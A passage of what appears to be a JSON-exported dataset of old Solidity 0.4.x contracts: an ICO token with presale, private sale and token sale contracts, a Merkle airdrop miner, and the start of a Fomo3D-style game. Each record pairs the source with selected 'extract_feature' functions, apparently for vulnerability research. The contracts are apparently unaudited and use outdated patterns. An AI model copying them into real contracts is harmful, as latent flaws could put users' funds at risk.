masterTransfersEnabled;\n address public masterWallet = 0x865e785f98b621c5fdde70821ca7cea9eeb77ef4;\n struct Checkpoint {\n uint128 fromBlock;\n uint128 value;\n }\n Checkpoint[] totalSupplyHistory;\n mapping(address => Checkpoint[]) balances;\n mapping (address => mapping (address => uint)) allowed;\n bool public mintingFinished = false;\n bool public presaleBalancesLocked = false;\n uint256 public totalSupplyAtCheckpoint;\n event MintFinished();\n event NewCloneToken(address indexed cloneToken);\n event Approval(address indexed _owner, address indexed _spender, uint256 _amount);\n event Transfer(address indexed from, address indexed to, uint256 value);\n constructor(\n address _tokenFactory,\n address _parentToken,\n uint256 _parentSnapShotBlock,\n string _tokenName,\n string _tokenSymbol\n ) public {\n tokenFactory = TokenFactoryInterface(_tokenFactory);\n parentToken = LedTokenInterface(_parentToken);\n parentSnapShotBlock = _parentSnapShotBlock;\n name = _tokenName;\n symbol = _tokenSymbol;\n decimals = 18;\n transfersEnabled = false;\n masterTransfersEnabled = false;\n creationBlock = block.number;\n version = '0.1';\n }\n function totalSupply() public constant returns (uint256) {\n return totalSupplyAt(block.number);\n }\n function totalSupplyAt(uint256 _blockNumber) public constant returns(uint256) {\n if ((totalSupplyHistory.length == 0) || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0x0) {\n return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(totalSupplyHistory, _blockNumber);\n }\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balanceOfAt(_owner, block.number);\n }\n function balanceOfAt(address _owner, uint256 _blockNumber) public constant returns (uint256) {\n if ((balances[_owner].length == 0) || (balances[_owner][0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0x0) {\n return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(balances[_owner], _blockNumber);\n }\n }\n function transfer(address _to, uint256 _amount) public returns (bool success) {\n return doTransfer(msg.sender, _to, _amount);\n }\n function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {\n require(allowed[_from][msg.sender] >= _amount);\n allowed[_from][msg.sender] -= _amount;\n return doTransfer(_from, _to, _amount);\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n require((_amount == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _amount;\n emit Approval(msg.sender, _spender, _amount);\n return true;\n }\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData) public returns (bool success) {\n approve(_spender, _amount);\n ApproveAndCallReceiver(_spender).receiveApproval(\n msg.sender,\n _amount,\n this,\n _extraData\n );\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function doTransfer(address _from, address _to, uint256 _amount) internal returns(bool) {\n if (msg.sender != masterWallet) {\n require(transfersEnabled);\n } else {\n require(masterTransfersEnabled);\n }\n require(_amount > 0);\n require(parentSnapShotBlock < block.number);\n require((_to != address(0)) && (_to != address(this)));\n uint256 previousBalanceFrom = balanceOfAt(_from, block.number);\n require(previousBalanceFrom >= _amount);\n updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\n uint256 previousBalanceTo = balanceOfAt(_to, block.number);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(balances[_to], previousBalanceTo + _amount);\n emit Transfer(_from, _to, _amount);\n return true;\n }\n function mint(address _owner, uint256 _amount) public onlyController canMint returns (bool) {\n uint256 curTotalSupply = totalSupply();\n uint256 previousBalanceTo = balanceOf(_owner);\n require(curTotalSupply + _amount >= curTotalSupply);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\n updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\n emit Transfer(0, _owner, _amount);\n return true;\n }\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function importPresaleBalances(address[] _addresses, uint256[] _balances) public onlyController returns (bool) {\n require(presaleBalancesLocked == false);\n for (uint256 i = 0; i < _addresses.length; i++) {\n totalSupplyAtCheckpoint += _balances[i];\n updateValueAtNow(balances[_addresses[i]], _balances[i]);\n updateValueAtNow(totalSupplyHistory, totalSupplyAtCheckpoint);\n emit Transfer(0, _addresses[i], _balances[i]);\n }\n return true;\n }\n function lockPresaleBalances() public onlyController returns (bool) {\n presaleBalancesLocked = true;\n return true;\n }\n function finishMinting() public onlyController returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n function enableTransfers(bool _value) public onlyController {\n transfersEnabled = _value;\n }\n function enableMasterTransfers(bool _value) public onlyController {\n masterTransfersEnabled = _value;\n }\n function getValueAt(Checkpoint[] storage _checkpoints, uint256 _block) constant internal returns (uint256) {\n if (_checkpoints.length == 0)\n return 0;\n if (_block >= _checkpoints[_checkpoints.length-1].fromBlock)\n return _checkpoints[_checkpoints.length-1].value;\n if (_block < _checkpoints[0].fromBlock)\n return 0;\n uint256 min = 0;\n uint256 max = _checkpoints.length-1;\n while (max > min) {\n uint256 mid = (max + min + 1) / 2;\n if (_checkpoints[mid].fromBlock<=_block) {\n min = mid;\n } else {\n max = mid-1;\n }\n }\n return _checkpoints[min].value;\n }\n function updateValueAtNow(Checkpoint[] storage _checkpoints, uint256 _value) internal {\n if ((_checkpoints.length == 0) || (_checkpoints[_checkpoints.length-1].fromBlock < block.number)) {\n Checkpoint storage newCheckPoint = _checkpoints[_checkpoints.length++];\n newCheckPoint.fromBlock = uint128(block.number);\n newCheckPoint.value = uint128(_value);\n } else {\n Checkpoint storage oldCheckPoint = _checkpoints[_checkpoints.length-1];\n oldCheckPoint.value = uint128(_value);\n }\n }\n function min(uint256 a, uint256 b) internal pure returns (uint) {\n return a < b ? a : b;\n }\n function createCloneToken(uint256 _snapshotBlock, string _name, string _symbol) public returns(address) {\n if (_snapshotBlock == 0) {\n _snapshotBlock = block.number;\n }\n if (_snapshotBlock > block.number) {\n _snapshotBlock = block.number;\n }\n LedToken cloneToken = tokenFactory.createCloneToken(\n this,\n _snapshotBlock,\n _name,\n _symbol\n );\n cloneToken.transferControl(msg.sender);\n emit NewCloneToken(address(cloneToken));\n return address(cloneToken);\n }\n}\ncontract LedTokenInterface is Controllable {\n bool public transfersEnabled;\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n event ClaimedTokens(address indexed _token, address indexed _owner, uint _amount);\n event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\n event Approval(address indexed _owner, address indexed _spender, uint256 _amount);\n event Transfer(address indexed from, address indexed to, uint256 value);\n function totalSupply() public constant returns (uint);\n function totalSupplyAt(uint _blockNumber) public constant returns(uint);\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function balanceOfAt(address _owner, uint _blockNumber) public constant returns (uint);\n function transfer(address _to, uint256 _amount) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success);\n function approve(address _spender, uint256 _amount) public returns (bool success);\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n function mint(address _owner, uint _amount) public returns (bool);\n function importPresaleBalances(address[] _addresses, uint256[] _balances, address _presaleAddress) public returns (bool);\n function lockPresaleBalances() public returns (bool);\n function finishMinting() public returns (bool);\n function enableTransfers(bool _value) public;\n function enableMasterTransfers(bool _value) public;\n function createCloneToken(uint _snapshotBlock, string _cloneTokenName, string _cloneTokenSymbol) public returns (address);\n}\ncontract Presale is Crowdsale {\n uint256 public tokenCap = PRESALE_TOKENCAP;\n uint256 public cap = tokenCap * DECIMALS_MULTIPLIER;\n uint256 public weiCap = tokenCap * PRESALE_BASE_PRICE_IN_WEI;\n constructor(address _tokenAddress, uint256 _startTime, uint256 _endTime) public {\n startTime = _startTime;\n endTime = _endTime;\n ledToken = LedTokenInterface(_tokenAddress);\n assert(_tokenAddress != 0x0);\n assert(_startTime > 0);\n assert(_endTime > _startTime);\n }\n function() public payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable whenNotPaused whenNotFinalized {\n require(_beneficiary != 0x0);\n require(validPurchase());\n uint256 weiAmount = msg.value;\n require(weiAmount >= MIN_PURCHASE_OTHERSALES && weiAmount <= MAX_PURCHASE);\n uint256 priceInWei = PRESALE_BASE_PRICE_IN_WEI;\n totalWeiRaised = totalWeiRaised.add(weiAmount);\n uint256 bonusPercentage = determineBonus(weiAmount);\n uint256 bonusTokens;\n uint256 initialTokens = weiAmount.mul(DECIMALS_MULTIPLIER).div(priceInWei);\n if(bonusPercentage>0){\n uint256 initialDivided = initialTokens.div(100);\n bonusTokens = initialDivided.mul(bonusPercentage);\n } else {\n bonusTokens = 0;\n }\n uint256 tokens = initialTokens.add(bonusTokens);\n tokensMinted = tokensMinted.add(tokens);\n require(tokensMinted < cap);\n contributors = contributors.add(1);\n ledToken.mint(_beneficiary, tokens);\n emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function determineBonus(uint256 _wei) public view returns (uint256) {\n if(_wei > PRESALE_LEVEL_1) {\n if(_wei > PRESALE_LEVEL_2) {\n if(_wei > PRESALE_LEVEL_3) {\n if(_wei > PRESALE_LEVEL_4) {\n if(_wei > PRESALE_LEVEL_5) {\n return PRESALE_PERCENTAGE_5;\n } else {\n return PRESALE_PERCENTAGE_4;\n }\n } else {\n return PRESALE_PERCENTAGE_3;\n }\n } else {\n return PRESALE_PERCENTAGE_2;\n }\n } else {\n return PRESALE_PERCENTAGE_1;\n }\n } else {\n return 0;\n }\n }\n function finalize() public onlyOwner {\n require(paused);\n require(!finalized);\n surplusTokens = cap - tokensMinted;\n ledToken.mint(ledMultiSig, surplusTokens);\n ledToken.transferControl(owner);\n emit Finalized();\n finalized = true;\n }\n function getInfo() public view returns(uint256, uint256, string, bool, uint256, uint256, uint256,\n bool, uint256, uint256){\n uint256 decimals = 18;\n string memory symbol = \"LED\";\n bool transfersEnabled = ledToken.transfersEnabled();\n return (\n TOTAL_TOKENCAP,\n decimals,\n symbol,\n transfersEnabled,\n contributors,\n totalWeiRaised,\n tokenCap,\n started,\n startTime,\n endTime\n );\n }\n function getInfoLevels() public view returns(uint256, uint256, uint256, uint256, uint256, uint256,\n uint256, uint256, uint256, uint256){\n return (\n PRESALE_LEVEL_1,\n PRESALE_LEVEL_2,\n PRESALE_LEVEL_3,\n PRESALE_LEVEL_4,\n PRESALE_LEVEL_5,\n PRESALE_PERCENTAGE_1,\n PRESALE_PERCENTAGE_2,\n PRESALE_PERCENTAGE_3,\n PRESALE_PERCENTAGE_4,\n PRESALE_PERCENTAGE_5\n );\n }\n}\ncontract PrivateSale is Crowdsale {\n uint256 public tokenCap = PRIVATESALE_TOKENCAP;\n uint256 public cap = tokenCap * DECIMALS_MULTIPLIER;\n uint256 public weiCap = tokenCap * PRIVATESALE_BASE_PRICE_IN_WEI;\n constructor(address _tokenAddress, uint256 _startTime, uint256 _endTime) public {\n startTime = _startTime;\n endTime = _endTime;\n ledToken = LedTokenInterface(_tokenAddress);\n assert(_tokenAddress != 0x0);\n assert(_startTime > 0);\n assert(_endTime > _startTime);\n }\n function() public payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable whenNotPaused whenNotFinalized {\n require(_beneficiary != 0x0);\n require(validPurchase());\n uint256 weiAmount = msg.value;\n require(weiAmount >= MIN_PURCHASE_OTHERSALES && weiAmount <= MAX_PURCHASE);\n uint256 priceInWei = PRIVATESALE_BASE_PRICE_IN_WEI;\n totalWeiRaised = totalWeiRaised.add(weiAmount);\n uint256 tokens = weiAmount.mul(DECIMALS_MULTIPLIER).div(priceInWei);\n tokensMinted = tokensMinted.add(tokens);\n require(tokensMinted < cap);\n contributors = contributors.add(1);\n ledToken.mint(_beneficiary, tokens);\n emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function finalize() public onlyOwner {\n require(paused);\n require(!finalized);\n surplusTokens = cap - tokensMinted;\n ledToken.mint(ledMultiSig, surplusTokens);\n ledToken.transferControl(owner);\n emit Finalized();\n finalized = true;\n }\n function getInfo() public view returns(uint256, uint256, string, bool, uint256, uint256, uint256,\n bool, uint256, uint256){\n uint256 decimals = 18;\n string memory symbol = \"LED\";\n bool transfersEnabled = ledToken.transfersEnabled();\n return (\n TOTAL_TOKENCAP,\n decimals,\n symbol,\n transfersEnabled,\n contributors,\n totalWeiRaised,\n tokenCap,\n started,\n startTime,\n endTime\n );\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract TokenFactory {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n string _tokenSymbol\n ) public returns (LedToken) {\n LedToken newToken = new LedToken(\n this,\n _parentToken,\n _snapshotBlock,\n _tokenName,\n _tokenSymbol\n );\n newToken.transferControl(msg.sender);\n return newToken;\n }\n}\ncontract TokenFactoryInterface {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n string _tokenSymbol\n ) public returns (LedToken newToken);\n}\ncontract TokenSale is Crowdsale {\n uint256 public tokenCap = ICO_TOKENCAP;\n uint256 public cap = tokenCap * DECIMALS_MULTIPLIER;\n uint256 public weiCap = tokenCap * ICO_BASE_PRICE_IN_WEI;\n uint256 public allocatedTokens;\n constructor(address _tokenAddress, uint256 _startTime, uint256 _endTime) public {\n startTime = _startTime;\n endTime = _endTime;\n ledToken = LedTokenInterface(_tokenAddress);\n assert(_tokenAddress != 0x0);\n assert(_startTime > 0);\n assert(_endTime > _startTime);\n }\n function() public payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable whenNotPaused whenNotFinalized {\n require(_beneficiary != 0x0);\n require(validPurchase());\n uint256 weiAmount = msg.value;\n require(weiAmount >= MIN_PURCHASE_OTHERSALES && weiAmount <= MAX_PURCHASE);\n uint256 priceInWei = ICO_BASE_PRICE_IN_WEI;\n totalWeiRaised = totalWeiRaised.add(weiAmount);\n uint256 bonusPercentage = determineBonus(weiAmount);\n uint256 bonusTokens;\n uint256 initialTokens = weiAmount.mul(DECIMALS_MULTIPLIER).div(priceInWei);\n if(bonusPercentage>0){\n uint256 initialDivided = initialTokens.div(100);\n bonusTokens = initialDivided.mul(bonusPercentage);\n } else {\n bonusTokens = 0;\n }\n uint256 tokens = initialTokens.add(bonusTokens);\n tokensMinted = tokensMinted.add(tokens);\n require(tokensMinted < cap);\n contributors = contributors.add(1);\n ledToken.mint(_beneficiary, tokens);\n emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);\n forwardFunds();\n }\n function determineBonus(uint256 _wei) public view returns (uint256) {\n if(_wei > ICO_LEVEL_1) {\n if(_wei > ICO_LEVEL_2) {\n if(_wei > ICO_LEVEL_3) {\n if(_wei > ICO_LEVEL_4) {\n if(_wei > ICO_LEVEL_5) {\n return ICO_PERCENTAGE_5;\n } else {\n return ICO_PERCENTAGE_4;\n }\n } else {\n return ICO_PERCENTAGE_3;\n }\n } else {\n return ICO_PERCENTAGE_2;\n }\n } else {\n return ICO_PERCENTAGE_1;\n }\n } else {\n return 0;\n }\n }\n function allocateLedTokens() public onlyOwner whenNotFinalized {\n require(!ledTokensAllocated);\n allocatedTokens = LEDTEAM_TOKENS.mul(DECIMALS_MULTIPLIER);\n ledToken.mint(ledMultiSig, allocatedTokens);\n ledTokensAllocated = true;\n }\n function finalize() public onlyOwner {\n require(paused);\n require(ledTokensAllocated);\n surplusTokens = cap - tokensMinted;\n ledToken.mint(ledMultiSig, surplusTokens);\n ledToken.finishMinting();\n ledToken.enableTransfers(true);\n emit Finalized();\n finalized = true;\n }\n function getInfo() public view returns(uint256, uint256, string, bool, uint256, uint256, uint256,\n bool, uint256, uint256){\n uint256 decimals = 18;\n string memory symbol = \"LED\";\n bool transfersEnabled = ledToken.transfersEnabled();\n return (\n TOTAL_TOKENCAP,\n decimals,\n symbol,\n transfersEnabled,\n contributors,\n totalWeiRaised,\n tokenCap,\n started,\n startTime,\n endTime\n );\n }\n function getInfoLevels() public view returns(uint256, uint256, uint256, uint256, uint256, uint256,\n uint256, uint256, uint256, uint256){\n return (\n ICO_LEVEL_1,\n ICO_LEVEL_2,\n ICO_LEVEL_3,\n ICO_LEVEL_4,\n ICO_LEVEL_5,\n ICO_PERCENTAGE_1,\n ICO_PERCENTAGE_2,\n ICO_PERCENTAGE_3,\n ICO_PERCENTAGE_4,\n ICO_PERCENTAGE_5\n );\n }\n}",
  "extract_feature": [
    "function totalSupply() public constant returns (uint256) {\nreturn totalSupplyAt(block.number);\n}",
    "function balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balanceOfAt(_owner, block.number);\n}",
    "function doTransfer(address _from, address _to, uint256 _amount) internal returns(bool) {\nif (msg.sender != masterWallet) {\nrequire(transfersEnabled);\n} else {\nrequire(masterTransfersEnabled);\n}\nrequire(_amount > 0);\nrequire(parentSnapShotBlock < block.number);\nrequire((_to != address(0)) && (_to != address(this)));\nuint256 previousBalanceFrom = balanceOfAt(_from, block.number);\nrequire(previousBalanceFrom >= _amount);\nupdateValueAtNow(balances[_from], previousBalanceFrom - _amount);\nuint256 previousBalanceTo = balanceOfAt(_to, block.number);\nrequire(previousBalanceTo + _amount >= previousBalanceTo);\nupdateValueAtNow(balances[_to], previousBalanceTo + _amount);\nemit Transfer(_from, _to, _amount);\nreturn true;\n}",
    "function updateValueAtNow(Checkpoint[] storage _checkpoints, uint256 _value) internal {\nif ((_checkpoints.length == 0) || (_checkpoints[_checkpoints.length-1].fromBlock < block.number)) {\nCheckpoint storage newCheckPoint = _checkpoints[_checkpoints.length++];\nnewCheckPoint.fromBlock = uint128(block.number);\nnewCheckPoint.value = uint128(_value);\n} else {\nCheckpoint storage oldCheckPoint = _checkpoints[_checkpoints.length-1];\noldCheckPoint.value = uint128(_value);\n}\n}",
    "function createCloneToken(uint256 _snapshotBlock, string _name, string _symbol) public returns(address) {\nif (_snapshotBlock == 0) {\n_snapshotBlock = block.number;\n}\nif (_snapshotBlock > block.number) {\n_snapshotBlock = block.number;\n}\nLedToken cloneToken = tokenFactory.createCloneToken(\nthis,\n_snapshotBlock,\n_name,\n_symbol\n);\ncloneToken.transferControl(msg.sender);\nemit NewCloneToken(address(cloneToken));\nreturn address(cloneToken);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b63"
  },
  "filename": "2990.sol",
  "content": "pragma solidity 0.4.24;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary MerkleProof {\n function verifyProof(bytes _proof, bytes32 _root, bytes32 _leaf) public pure returns (bool) {\n if (_proof.length % 32 != 0) return false;\n bytes32 proofElement;\n bytes32 computedHash = _leaf;\n for (uint256 i = 32; i <= _proof.length; i += 32) {\n assembly {\n proofElement := mload(add(_proof, i))\n }\n if (computedHash < proofElement) {\n computedHash = keccak256(computedHash, proofElement);\n } else {\n computedHash = keccak256(proofElement, computedHash);\n }\n }\n return computedHash == _root;\n }\n}\ncontract MerkleMine {\n using SafeMath for uint256;\n ERC20 public token;\n bytes32 public genesisRoot;\n uint256 public totalGenesisTokens;\n uint256 public totalGenesisRecipients;\n uint256 public tokensPerAllocation;\n uint256 public balanceThreshold;\n uint256 public genesisBlock;\n uint256 public callerAllocationStartBlock;\n uint256 public callerAllocationEndBlock;\n uint256 public callerAllocationPeriod;\n bool public started;\n mapping (address => bool) public generated;\n modifier notGenerated(address _recipient) {\n require(!generated[_recipient]);\n _;\n }\n modifier isStarted() {\n require(started);\n _;\n }\n modifier isNotStarted() {\n require(!started);\n _;\n }\n event Generate(address indexed _recipient, address indexed _caller, uint256 _recipientTokenAmount, uint256 _callerTokenAmount, uint256 _block);\n function MerkleMine(\n address _token,\n bytes32 _genesisRoot,\n uint256 _totalGenesisTokens,\n uint256 _totalGenesisRecipients,\n uint256 _balanceThreshold,\n uint256 _genesisBlock,\n uint256 _callerAllocationStartBlock,\n uint256 _callerAllocationEndBlock\n )\n public\n {\n require(_token != address(0));\n require(_totalGenesisRecipients > 0);\n require(_genesisBlock <= block.number);\n require(_callerAllocationStartBlock > block.number);\n require(_callerAllocationEndBlock > _callerAllocationStartBlock);\n token = ERC20(_token);\n genesisRoot = _genesisRoot;\n totalGenesisTokens = _totalGenesisTokens;\n totalGenesisRecipients = _totalGenesisRecipients;\n tokensPerAllocation = _totalGenesisTokens.div(_totalGenesisRecipients);\n balanceThreshold = _balanceThreshold;\n genesisBlock = _genesisBlock;\n callerAllocationStartBlock = _callerAllocationStartBlock;\n callerAllocationEndBlock = _callerAllocationEndBlock;\n callerAllocationPeriod = _callerAllocationEndBlock.sub(_callerAllocationStartBlock);\n }\n function start() external isNotStarted {\n require(token.balanceOf(this) >= totalGenesisTokens);\n started = true;\n }\n function generate(address _recipient, bytes _merkleProof) external isStarted notGenerated(_recipient) {\n bytes32 leaf = keccak256(_recipient);\n require(MerkleProof.verifyProof(_merkleProof, genesisRoot, leaf));\n generated[_recipient] = true;\n address caller = msg.sender;\n if (caller == _recipient) {\n require(token.transfer(_recipient, tokensPerAllocation));\n Generate(_recipient, _recipient, tokensPerAllocation, 0, block.number);\n } else {\n require(block.number >= callerAllocationStartBlock);\n uint256 callerTokenAmount = callerTokenAmountAtBlock(block.number);\n uint256 recipientTokenAmount = tokensPerAllocation.sub(callerTokenAmount);\n if (callerTokenAmount > 0) {\n require(token.transfer(caller, callerTokenAmount));\n }\n if (recipientTokenAmount > 0) {\n require(token.transfer(_recipient, recipientTokenAmount));\n }\n Generate(_recipient, caller, recipientTokenAmount, callerTokenAmount, block.number);\n }\n }\n function callerTokenAmountAtBlock(uint256 _blockNumber) public view returns (uint256) {\n if (_blockNumber < callerAllocationStartBlock) {\n return 0;\n } else if (_blockNumber >= callerAllocationEndBlock) {\n return tokensPerAllocation;\n } else {\n uint256 blocksSinceCallerAllocationStartBlock = _blockNumber.sub(callerAllocationStartBlock);\n return tokensPerAllocation.mul(blocksSinceCallerAllocationStartBlock).div(callerAllocationPeriod);\n }\n }\n}\nlibrary BytesUtil{\n uint256 internal constant BYTES_HEADER_SIZE = 32;\n uint256 internal constant WORD_SIZE = 32;\n function dataPtr(bytes memory bts) internal pure returns (uint256 addr) {\n assembly {\n addr := add(bts, 32)\n }\n }\n function copy(uint256 src, uint256 dest, uint256 len) internal pure {\n for (; len >= WORD_SIZE; len -= WORD_SIZE) {\n assembly {\n mstore(dest, mload(src))\n }\n dest += WORD_SIZE;\n src += WORD_SIZE;\n }\n uint256 mask = 256 ** (WORD_SIZE - len) - 1;\n assembly {\n let srcpart := and(mload(src), not(mask))\n let destpart := and(mload(dest), mask)\n mstore(dest, or(destpart, srcpart))\n }\n }\n function toBytes(uint256 addr, uint256 len) internal pure returns (bytes memory bts) {\n bts = new bytes(len);\n uint256 btsptr = dataPtr(bts);\n copy(addr, btsptr, len);\n }\n function substr(bytes memory bts, uint256 startIndex, uint256 len) internal pure returns (bytes memory) {\n require(startIndex + len <= bts.length);\n if (len == 0) {\n return;\n }\n uint256 addr = dataPtr(bts);\n return toBytes(addr + startIndex, len);\n }\n function readBytes32(bytes memory bts, uint256 startIndex) internal pure returns (bytes32 result) {\n require(startIndex + 32 <= bts.length);\n uint256 addr = dataPtr(bts);\n assembly {\n result := mload(add(addr, startIndex))\n }\n return result;\n }\n}\ncontract MultiMerkleMine {\n using SafeMath for uint256;\n function multiGenerate(address _merkleMineContract, address[] _recipients, bytes _merkleProofs) public {\n MerkleMine mine = MerkleMine(_merkleMineContract);\n ERC20 token = ERC20(mine.token());\n require(\n block.number >= mine.callerAllocationStartBlock(),\n \"caller allocation period has not started\"\n );\n uint256 initialBalance = token.balanceOf(this);\n bytes[] memory proofs = new bytes[](_recipients.length);\n uint256 i = 0;\n uint256 j = 0;\n while(i < _merkleProofs.length){\n uint256 proofSize = uint256(BytesUtil.readBytes32(_merkleProofs, i));\n require(\n proofSize % 32 == 0,\n \"proof size must be a multiple of 32\"\n );\n proofs[j] = BytesUtil.substr(_merkleProofs, i + 32, proofSize);\n i = i + 32 + proofSize;\n j++;\n }\n require(\n _recipients.length == j,\n \"number of recipients != number of proofs\"\n );\n for (uint256 k = 0; k < _recipients.length; k++) {\n if (!mine.generated(_recipients[k])) {\n mine.generate(_recipients[k], proofs[k]);\n }\n }\n uint256 newBalanceSinceAllocation = token.balanceOf(this);\n uint256 callerTokensGenerated = newBalanceSinceAllocation.sub(initialBalance);\n if (callerTokensGenerated > 0) {\n require(token.transfer(msg.sender, callerTokensGenerated));\n }\n }\n}",
  "extract_feature": [
    "function generate(address _recipient, bytes _merkleProof) external isStarted notGenerated(_recipient) {\nbytes32 leaf = keccak256(_recipient);\nrequire(MerkleProof.verifyProof(_merkleProof, genesisRoot, leaf));\ngenerated[_recipient] = true;\naddress caller = msg.sender;\nif (caller == _recipient) {\nrequire(token.transfer(_recipient, tokensPerAllocation));\nGenerate(_recipient, _recipient, tokensPerAllocation, 0, block.number);\n} else {\nrequire(block.number >= callerAllocationStartBlock);\nuint256 callerTokenAmount = callerTokenAmountAtBlock(block.number);\nuint256 recipientTokenAmount = tokensPerAllocation.sub(callerTokenAmount);\nif (callerTokenAmount > 0) {\nrequire(token.transfer(caller, callerTokenAmount));\n}\nif (recipientTokenAmount > 0) {\nrequire(token.transfer(_recipient, recipientTokenAmount));\n}\nGenerate(_recipient, caller, recipientTokenAmount, callerTokenAmount, block.number);\n}\n}",
    "function multiGenerate(address _merkleMineContract, address[] _recipients, bytes _merkleProofs) public {\nMerkleMine mine = MerkleMine(_merkleMineContract);\nERC20 token = ERC20(mine.token());\nrequire(\nblock.number >= mine.callerAllocationStartBlock(),\n\"caller allocation period has not started\"\n);\nuint256 initialBalance = token.balanceOf(this);\nbytes[] memory proofs = new bytes[](_recipients.length);\nuint256 i = 0;\nuint256 j = 0;\nwhile(i < _merkleProofs.length){\nuint256 proofSize = uint256(BytesUtil.readBytes32(_merkleProofs, i));\nrequire(\nproofSize % 32 == 0,\n\"proof size must be a multiple of 32\"\n);\nproofs[j] = BytesUtil.substr(_merkleProofs, i + 32, proofSize);\ni = i + 32 + proofSize;\nj++;\n}\nrequire(\n_recipients.length == j,\n\"number of recipients != number of proofs\"\n);\nfor (uint256 k = 0; k < _recipients.length; k++) {\nif (!mine.generated(_recipients[k])) {\nmine.generate(_recipients[k], proofs[k]);\n}\n}\nuint256 newBalanceSinceAllocation = token.balanceOf(this);\nuint256 callerTokensGenerated = newBalanceSinceAllocation.sub(initialBalance);\nif (callerTokensGenerated > 0) {\nrequire(token.transfer(msg.sender, callerTokensGenerated));\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b64"
  },
  "filename": "2991.sol",
  "content": "pragma solidity ^0.4.24;\ncontract PCKevents {\n event onNewName\n (\n uint256 indexed playerID,\n address indexed playerAddress,\n bytes32 indexed playerName,\n bool isNewPlayer,\n uint256 affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 amountPaid,\n uint256 timeStamp\n );\n event onEndTx\n (\n uint256 compressedData,\n uint256 compressedIDs,\n bytes32 playerName,\n address playerAddress,\n uint256 ethIn,\n uint256 keysBought,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount,\n uint256 potAmount,\n uint256 airDropPot\n );\n event onWithdraw\n (\n uint256 indexed playerID,\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 timeStamp\n );\n event onWithdrawAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onBuyAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethIn,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onReLoadAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event 